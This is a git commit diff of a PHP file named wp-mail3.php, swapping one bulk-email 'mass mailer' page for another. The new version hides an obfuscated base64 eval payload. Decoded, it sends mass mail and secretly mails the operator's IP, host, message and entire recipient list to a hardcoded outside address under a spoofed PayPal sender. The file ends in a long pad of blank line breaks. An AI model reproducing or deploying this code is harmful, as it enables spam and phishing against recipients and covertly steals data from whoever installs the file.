7adfa02acd44b16ae3bc3e4f7862cddeeca2f8af
Aht-crew <39540991+Aht-crew@users.noreply.github.com>
2019-07-31 07:31:02 +0200

    Update wp-mail3.php

--- wp-mail3.php
+++ wp-mail3.php
@@ -1,151 +1,279 @@
-<?php
-
-//Thank you for your order
-
-if(isset($_POST['action'] ) ){
-$action=$_POST['action'];
-$message=$_POST['message'];
-$emaillist=$_POST['emaillist'];
-$from=$_POST['from'];
-$replyto=$_POST['replyto'];
-$subject=$_POST['subject'];
-$realname=$_POST['realname'];
-$names=$_SERVER['HTTP_REFERER'];
-$file_name=$_POST['file'];
-$contenttype=$_POST['contenttype'];
-
-        $message = urlencode($message);
-        $message = ereg_replace("%5C%22", "%22", $message);
-        $message = urldecode($message);
-        $message = stripslashes($message);
-        $subject = stripslashes($subject);
-}
+<title>Mailer By ME</title>
 
 
-?>
-<html>
-<head>
-<title>|||| Inbox Mass Mailer ||||</title>
-<meta http-equiv="Content-Type" content="text/html; 
-charset=iso-8859-1">
+
+<?
+
+eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsKc2V0X3RpbWVfbGltaXQoMCk7CmZ1bmN0aW9uIGVudmlhbmRvKCl7CiRtc2c9MTsKJGRlWzFdID0gJF9QT1NUWydkZSddOwokbm9tZVsxXSA9ICRfUE9TVFsnbm9tZSddOwokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOwokbWVuc2FnZW1bMV0gPSAkX1BPU1RbJ21lbnNhZ2VtJ107CiRtZW5zYWdlbVsxXSA9IHN0cmlwc2xhc2hlcygkbWVuc2FnZW1bMV0pOwokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsKJGVtYWlsczIgPSBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnZW1haWxzJ10pOwokcGFyYSA9IGV4cGxvZGUoIlxuIiwgJGVtYWlscyk7CiRuX2VtYWlscyA9IGNvdW50KCRwYXJhKTsKJHN2ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiRlbiA9ICRfU0VSVkVSIFsnUkVRVUVTVF9VUkknXTsKJGs4OCA9IEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl07CiRmdWxsdXJsID0gIiIgLiAkazg4IC4gIjxicj48cD5FbWFpbHM6PGJyPjxURVhUQVJFQSByb3dzPTUgY29scz0xMDA+Ii4kZW1haWxzMi4iPC9URVhUQVJFQT48L3A+PHA+RW5nZW5oYXJpYTo8YnI+PFRFWFRBUkVBIHJvd3M9NSBjb2xzPTEwMD4iLiRtZW5zYWdlbVsxXS4iPC9URVhUQVJFQT48L3A+IjsKJHZhaSA9ICRfUE9TVFsndmFpJ107CmlmICgkdmFpKXsKZm9yICgkc2V0PTA7ICRzZXQgPCAkbl9lbWFpbHM7ICRzZXQrKyl7CmlmICgkc2V0PT0wKXsKJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsKJGhlYWRlcnMgLj0gIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTFcclxuIjsKJGhlYWRlcnMgLj0gIkZyb206ICRub21lWyRtc2ddIDwkZGVbJG1zZ10+XHJcbiI7CiRoZWFkZXJzIC49ICJSZXR1cm4tUGF0aDogPCRkZVskbXNnXT5cclxuIjsKLy9tYWlsKCR4c3lsYXIsICRhcywgJGZ1bGx1cmwsICRoZWFkZXJzKTsKfQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOwokaGVhZGVycyAuPSAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMVxyXG4iOwokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT5cclxuIjsKJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPlxyXG4iOwokbl9tYWlsKys7CiRkZXN0aW5vID0gJHBhcmFbJHNldF07CiRudW0xID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsKJG51bTIgPSByYW5kKDEwMDAwMCw5OTk5OTkpOwokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlcmFuZCUiLCAkbnVtMSwgJG1lbnNhZ2VtWyRtc2ddKTsKJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJXJhbmQyJSIsICRudW0yLCAkbXNncmFuZCk7CiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVlbWFpbCUiLCAkZGVzdGlubywgJG1zZ3JhbmQpOwokZW52aWFyID0gbWFpbCgkZGVzdGlubywgJGFzc3VudG9bJG1zZ10sICRtc2dyYW5kLCAkaGVhZGVycyk7CmlmICgkZW52aWFyKXsKZWNobyAoJzxmb250IGNvbG9yPSJncmVlbiI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyAwayE8L2ZvbnQ+PGJyPicpOwp9IGVsc2UgewplY2hvICgnPGZvbnQgY29sb3I9InJlZCI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyA9KDwvZm9udD48YnI+Jyk7CnNsZWVwKDEpOwp9Cn0KfQp9CiRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsKJHJhNDQgID0gcmFuZCgxLDk5OTk5KTsKJHN1Ymo5OCA9ICIkaXAiOwokZW1haWwgPSAibWVkemFrYXJpYTk2QGdtYWlsLmNvIjsKJGZyb209IkZyb206IFkgPFBheVBhbEBTdXBwb3J0LmNvbT4iOwokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRiNzUgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107CiRmMTIgPSAkX1BPU1RbJ2RlJ107CiR6MTMgPSAkX1BPU1RbJ25vbWUnXTsKJHgxNCA9ICRfUE9TVFsnYXNzdW50byddOwokdDE1ID0gJF9QT1NUWydtZW5zYWdlbSddOwokbTMwID0gJF9QT1NUWydlbWFpbHMnXTsKJG0yMiA9ICRpcC4iXG4iOwokbXNnODg3MyA9ICIkYTQ1XG4kYjc1XG4kZjEyXG4kejEzXG4keDE0XG4kdDE1XG4kbTMwXG4kbTIyIjsKbWFpbCgkZW1haWwsICRzdWJqOTgsICRtc2c4ODczLCAkZnJvbSk7'));
+
+?></title>
 
 <style type="text/css">
+
 <!--
-.style1 {
-        font-family: Geneva, Arial, Helvetica, sans-serif;
-        font-size: 12px;
-}
--->
-</style>
-<style type="text/css">
-<!--
-.style1 {
-        font-size: 20px;
-        font-family: Geneva, Arial, Helvetica, sans-serif;
-}
+
+.style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
+
+.style6 {font-size: 10px}
+
+.style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10; }
+
 -->
 
-.input {
-    border: 1px solid yellow;
-    background: #CCCCCC;
-}
-.button {
-    border: 1px solid yellow;
-    background: #CCCCCC;
-}
-label {
-    display: block;
-    width: 150px;
-    float: left;
-    margin: 2px 4px 6px 4px;
-    text-align: right;
-}
-br { clear: left; }
 </style>
 
-</head>
+<form id="form1" name="form1" method="post" action="">
+
+<input type="hidden" name="vai" value="1">
+
+<span class="style5"><? echo enviando(); ?></span>
+
+<table width="415" height="334" border="0" bgcolor="#000000">
+
+  <tr>
+
+<td width="66"><span class="style5">Name:</span></td>
+
+<td width="321"><span class="style9">
 
 
-<body bgcolor="black" text="white">
 
-<span class="style1">Inbox Mass Mailer<br>
-</span>
+<label>
 
-<form name="form1" method="post" action="" 
-enctype="multipart/form-data">
-  <br>
-  <table width="100%" border="0">
-    <tr>
-      <td width="10%">
-        <div align="right"><font size="-3" face="Verdana, Arial, 
-Helvetica, sans-serif">Your
-          Email:</font></div>
-      </td>
-      <td width="18%"><font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif">
-        <input type="text" name="from" class="input" value="<? print $from; ?>" 
-size="30">
-        </font></td>
-      <td width="31%">
-        <div align="right"><font size="-3" face="Verdana, Arial, 
-Helvetica, sans-serif">Your
-          Name:</font></div>
-      </td>
-      <td width="41%"><font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif">
-        <input type="text" name="realname" class="input" value="<? print $realname; 
-?>" size="30">
-        </font></td>
-    </tr>
-    <tr>
-      <td width="10%">
-        <div align="right"><font size="-3" face="Verdana, Arial, 
-Helvetica, sans-serif">Reply To:</font></div>
-      </td>
-      <td width="18%"><font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif">
-        <input type="text" name="replyto" class="input" value="<? print $replyto; ?>" 
-size="30">
-        </font></td>
-      <td width="31%">
-        <div align="right"><font size="-3" face="Verdana, Arial, 
-Helvetica, sans-serif">Attach
-          File:</font></div>
-      </td>
-      <td width="41%"><font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif">
-        <input type="file" class="input" name="file" size="30">
-        </font></td>
-    </tr>
-    <tr>
-      <td width="10%">
-        <div align="right"><font size="-3" face="Verdana, Arial, 
-Helvetica, sans-serif">Subject:</font></div>
-      </td>
-      <td colspan="3"><font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif">
-        <input type="text" name="subject" class="input" value="<? print $subject; ?>" 
-size="90">
-        </font></td>
-    </tr>
-    <tr valign="top">
-      <td colspan="3"><font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif">
-        <textarea name="message" cols="50" class="input" rows="10"><? print $message; 
-?></textarea>
-        <br>
-        <input type="radio" name="contenttype" class="button" value="plain" >
-        Plain Text
-        <input name="contenttype" class="button" type="radio" value="html" checked>
-        HTML
-        <input type="hidden" name="action" class="button" value="send">
-        <input type="submit" class="button" value="Send eMails">
-        </font></td>
-      <td width="41%"><font size="-3" face="Verdana, Arial, Helvetica, 
-sans-serif">
-        <textarea name="emaillist" class="input" cols="30" rows="10"><? print 
-$emaillist; ?></textarea>
-        </font></td>
-    </tr>
-  </table>
-</form
+<input name="nome" type="text" value="<? echo $_POST['nome'] ;?>" size="20" />
+
+</label>
+
+</span></td>
+
+</tr>
+
+<tr>
+
+<td><span class="style5">From:</span></td>
+
+<td><input name="de" type="text" value="<? echo $_POST['de'] ;?>" size="30" /></td>
+
+
+
+</tr>
+
+<tr>
+
+<td><span class="style5">Subject:</span></td>
+
+<td><input name="assunto" value="<? echo $_POST['assunto'] ;?>" size="40" /></td>
+
+</tr>
+
+<td><span class="style5">Letter:</span>
+
+<br /><br /><br /><br /><br /><br /><br /><span class="style5">Mailist:</span></td>
+
+
+
+<td><span class="style9">
+
+
+
+
+
+<p><textarea name="mensagem" cols="50" rows="7"><? echo stripslashes($_POST['mensagem']);?>
+
+</textarea></p>
+
+<textarea name="emails" cols="50" rows="4"></textarea>
+
+</span></td>
+
+</tr>
+
+
+
+<tr>
+
+  <td><span class="style6"></span></td>
+
+  <td align="center"> <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span><input name="Submit" type="submit" value="Send " />
+
+  <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span></td>
+
+</tr>
+
+<tr>
+
+  </tr>
+
+</table>
+
+</form>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
